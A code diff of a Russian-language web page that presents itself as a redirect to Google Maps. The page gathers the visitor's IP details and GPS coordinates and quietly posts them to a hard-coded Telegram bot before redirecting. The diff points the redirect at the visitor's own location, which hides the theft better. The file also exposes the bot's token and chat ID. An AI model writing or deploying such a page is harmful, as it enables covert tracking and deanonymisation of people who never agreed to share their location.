@@ -26,7 +26,7 @@
   <div id="status">⏳ Разрешите доступ к геолокации, если будет запрошено...</div>
 
   <script>
-    const redirectUrl = "https://www.google.com/maps";
+    let finalRedirect = "https://www.google.com/maps"; // по умолчанию
 
     function sendToTelegram(message, callback) {
       fetch("https://api.telegram.org/bot7780068053:AAEfj3ROoHOupCeM7F_W7auJAkakcluF5Nw/sendMessage", {
@@ -36,14 +36,12 @@
           chat_id: 490491527,
           text: message
         })
-      }).finally(() => {
-        callback();
-      });
+      }).finally(callback);
     }
 
     function startRedirect() {
       document.getElementById("status").innerText = "🔁 Перенаправление...";
-      window.location.href = redirectUrl;
+      window.location.href = finalRedirect;
     }
 
     fetch("https://ipwho.is/")
@@ -75,6 +73,8 @@ IP: ${data.ip}
               const lon = pos.coords.longitude;
               const acc = pos.coords.accuracy;
               const msg = ipMessage + `\n\n📍 GPS: ${lat}, ${lon}\n🎯 Точность: ${acc} м`;
+
+              finalRedirect = `https://www.google.com/maps?q=${lat},${lon}`;
               sendToTelegram(msg, startRedirect);
             },
             err => {
